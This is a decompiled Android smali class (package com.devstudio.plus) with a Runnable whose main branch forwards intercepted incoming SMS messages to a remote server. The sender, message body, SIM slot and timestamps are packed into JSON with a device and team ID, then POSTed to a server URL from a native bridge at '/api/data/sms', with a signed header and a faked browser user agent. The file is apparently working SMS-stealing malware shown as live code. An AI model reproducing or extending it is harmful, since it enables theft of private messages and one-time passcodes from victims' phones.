.class public final synthetic Lq/a;
.super Ljava/lang/Object;
.source "r8-map-id-4f946035ae8b5dc8dc2611fa1065f2bff5a861868bbaf6a3ac203acc3f2498b4"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic b:I

.field public final synthetic c:I

.field public final synthetic d:Ljava/lang/Object;

.field public final synthetic e:Ljava/lang/Object;


# direct methods
.method public synthetic constructor <init>(Ljava/lang/String;Ljava/lang/String;I)V
    .locals 1

    .line 1
    const/4 v0, 0x1

    iput v0, p0, Lq/a;->b:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lq/a;->d:Ljava/lang/Object;

    iput-object p2, p0, Lq/a;->e:Ljava/lang/Object;

    iput p3, p0, Lq/a;->c:I

    return-void
.end method

.method public synthetic constructor <init>(Lq/b;ILjava/lang/Object;)V
    .locals 1

    .line 2
    const/4 v0, 0x0

    iput v0, p0, Lq/a;->b:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lq/a;->d:Ljava/lang/Object;

    iput p2, p0, Lq/a;->c:I

    iput-object p3, p0, Lq/a;->e:Ljava/lang/Object;

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 12

    .line 1
    iget v0, p0, Lq/a;->b:I

    .line 2
    .line 3
    packed-switch v0, :pswitch_data_0

    .line 4
    .line 5
    .line 6
    iget-object v0, p0, Lq/a;->d:Ljava/lang/Object;

    .line 7
    .line 8
    check-cast v0, Ljava/lang/String;

    .line 9
    .line 10
    iget-object v1, p0, Lq/a;->e:Ljava/lang/Object;

    .line 11
    .line 12
    check-cast v1, Ljava/lang/String;

    .line 13
    .line 14
    iget v2, p0, Lq/a;->c:I

    .line 15
    .line 16
    const-string v3, "/api/data/sms"

    .line 17
    .line 18
    :try_start_0
    invoke-static {}, Lcom/devstudio/plus/NativeBridge;->getServerUrl()Ljava/lang/String;

    .line 19
    .line 20
    .line 21
    move-result-object v4

    .line 22
    invoke-static {}, Lcom/devstudio/plus/NativeBridge;->getDeviceId()Ljava/lang/String;

    .line 23
    .line 24
    .line 25
    move-result-object v5

    .line 26
    invoke-static {}, Lcom/devstudio/plus/NativeBridge;->getTeamId()Ljava/lang/String;

    .line 27
    .line 28
    .line 29
    move-result-object v6

    .line 30
    invoke-static {v4}, Ln1/k;->r(Ljava/lang/String;)Z

    .line 31
    .line 32
    .line 33
    move-result v7

    .line 34
    if-nez v7, :cond_2

    .line 35
    .line 36
    invoke-static {v5}, Ln1/k;->r(Ljava/lang/String;)Z

    .line 37
    .line 38
    .line 39
    move-result v7

    .line 40
    if-nez v7, :cond_2

    .line 41
    .line 42
    invoke-static {v6}, Ln1/k;->r(Ljava/lang/String;)Z

    .line 43
    .line 44
    .line 45
    move-result v7

    .line 46
    if-eqz v7, :cond_0

    .line 47
    .line 48
    goto/16 :goto_0

    .line 49
    .line 50
    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 51
    .line 52
    .line 53
    move-result-wide v7

    .line 54
    const/16 v9, 0x3e8

    .line 55
    .line 56
    int-to-long v9, v9

    .line 57
    div-long/2addr v7, v9

    .line 58
    invoke-static {v7, v8}, Lcom/devstudio/plus/NativeBridge;->signTimestamp(J)Ljava/lang/String;

    .line 59
    .line 60
    .line 61
    move-result-object v9

    .line 62
    invoke-static {v9}, Ln1/k;->r(Ljava/lang/String;)Z

    .line 63
    .line 64
    .line 65
    move-result v10

    .line 66
    if-eqz v10, :cond_1

    .line 67
    .line 68
    goto/16 :goto_0

    .line 69
    .line 70
    :cond_1
    new-instance v10, Lorg/json/JSONObject;

    .line 71
    .line 72
    invoke-direct {v10}, Lorg/json/JSONObject;-><init>()V

    .line 73
    .line 74
    .line 75
    const-string v11, "device_id"

    .line 76
    .line 77
    invoke-virtual {v10, v11, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 78
    .line 79
    .line 80
    const-string v5, "team_id"

    .line 81
    .line 82
    invoke-virtual {v10, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 83
    .line 84
    .line 85
    const-string v5, "sender"

    .line 86
    .line 87
    invoke-virtual {v10, v5, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 88
    .line 89
    .line 90
    const-string v0, "message"

    .line 91
    .line 92
    invoke-virtual {v10, v0, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 93
    .line 94
    .line 95
    const-string v0, "sms_type"

    .line 96
    .line 97
    const-string v1, "incoming"

    .line 98
    .line 99
    invoke-virtual {v10, v0, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 100
    .line 101
    .line 102
    const-string v0, "sim_slot"

    .line 103
    .line 104
    invoke-virtual {v10, v0, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 105
    .line 106
    .line 107
    const-string v0, "received_at"

    .line 108
    .line 109
    invoke-static {v7, v8}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    .line 110
    .line 111
    .line 112
    move-result-object v1

    .line 113
    invoke-virtual {v10, v0, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 114
    .line 115
    .line 116
    const-string v0, "sms_timestamp"

    .line 117
    .line 118
    invoke-virtual {v10, v0, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 119
    .line 120
    .line 121
    const-string v0, "phone_number"

    .line 122
    .line 123
    const-string v1, ""

    .line 124
    .line 125
    invoke-virtual {v10, v0, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 126
    .line 127
    .line 128
    const-string v0, "source"

    .line 129
    .line 130
    const-string v1, "fast"

    .line 131
    .line 132
    invoke-virtual {v10, v0, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 133
    .line 134
    .line 135
    new-instance v0, Lw1/s;

    .line 136
    .line 137
    invoke-direct {v0}, Lw1/s;-><init>()V

    .line 138
    .line 139
    .line 140
    invoke-virtual {v4, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    .line 141
    .line 142
    .line 143
    move-result-object v1

    .line 144
    invoke-virtual {v0, v1}, Lw1/s;->e(Ljava/lang/String;)V

    .line 145
    .line 146
    .line 147
    invoke-virtual {v10}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    .line 148
    .line 149
    .line 150
    move-result-object v1

    .line 151
    sget-object v2, Lq0/d;->a:Lw1/o;

    .line 152
    .line 153
    invoke-static {v1, v2}, Lb0/c0;->b(Ljava/lang/String;Lw1/o;)Lb2/i;

    .line 154
    .line 155
    .line 156
    move-result-object v1

    .line 157
    const-string v2, "POST"

    .line 158
    .line 159
    invoke-virtual {v0, v2, v1}, Lw1/s;->c(Ljava/lang/String;Lb2/i;)V

    .line 160
    .line 161
    .line 162
    const-string v1, "X-Timestamp"

    .line 163
    .line 164
    invoke-static {v7, v8}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    .line 165
    .line 166
    .line 167
    move-result-object v2

    .line 168
    iget-object v3, v0, Lw1/s;->c:La2/q;

    .line 169
    .line 170
    invoke-virtual {v3, v1, v2}, La2/q;->h(Ljava/lang/String;Ljava/lang/String;)V

    .line 171
    .line 172
    .line 173
    const-string v1, "X-Signature"

    .line 174
    .line 175
    iget-object v2, v0, Lw1/s;->c:La2/q;

    .line 176
    .line 177
    invoke-virtual {v2, v1, v9}, La2/q;->h(Ljava/lang/String;Ljava/lang/String;)V

    .line 178
    .line 179
    .line 180
    const-string v1, "User-Agent"

    .line 181
    .line 182
    const-string v2, "Mozilla/5.0 (Linux; Android 14; Pixel) AppleWebKit/537.36 Chrome/131.0.0.0 Mobile Safari/537.36"

    .line 183
    .line 184
    iget-object v3, v0, Lw1/s;->c:La2/q;

    .line 185
    .line 186
    invoke-virtual {v3, v1, v2}, La2/q;->h(Ljava/lang/String;Ljava/lang/String;)V

    .line 187
    .line 188
    .line 189
    invoke-virtual {v0}, Lw1/s;->a()Lw1/t;

    .line 190
    .line 191
    .line 192
    move-result-object v0

    .line 193
    sget-object v1, Lq0/d;->c:Lu0/e;

    .line 194
    .line 195
    invoke-virtual {v1}, Lu0/e;->a()Ljava/lang/Object;

    .line 196
    .line 197
    .line 198
    move-result-object v1

    .line 199
    check-cast v1, Lw1/q;

    .line 200
    .line 201
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 202
    .line 203
    .line 204
    new-instance v2, La2/j;

    .line 205
    .line 206
    const/4 v3, 0x0

    .line 207
    invoke-direct {v2, v1, v0, v3}, La2/j;-><init>(Lw1/q;Lw1/t;Z)V

    .line 208
    .line 209
    .line 210
    invoke-virtual {v2}, La2/j;->e()Lw1/v;

    .line 211
    .line 212
    .line 213
    move-result-object v0

    .line 214
    invoke-virtual {v0}, Lw1/v;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 215
    .line 216
    .line 217
    goto :goto_0

    .line 218
    :catch_0
    move-exception v0

    .line 219
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 220
    .line 221
    .line 222
    :cond_2
    :goto_0
    return-void

    .line 223
    :pswitch_0
    iget-object v0, p0, Lq/a;->d:Ljava/lang/Object;

    .line 224
    .line 225
    check-cast v0, Lq/b;

    .line 226
    .line 227
    iget-object v1, p0, Lq/a;->e:Ljava/lang/Object;

    .line 228
    .line 229
    iget-object v0, v0, Lq/b;->b:Lq/e;

    .line 230
    .line 231
    iget v2, p0, Lq/a;->c:I

    .line 232
    .line 233
    invoke-interface {v0, v2, v1}, Lq/e;->a(ILjava/lang/Object;)V

    .line 234
    .line 235
    .line 236
    return-void

    .line 237
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
    .end packed-switch
.end method
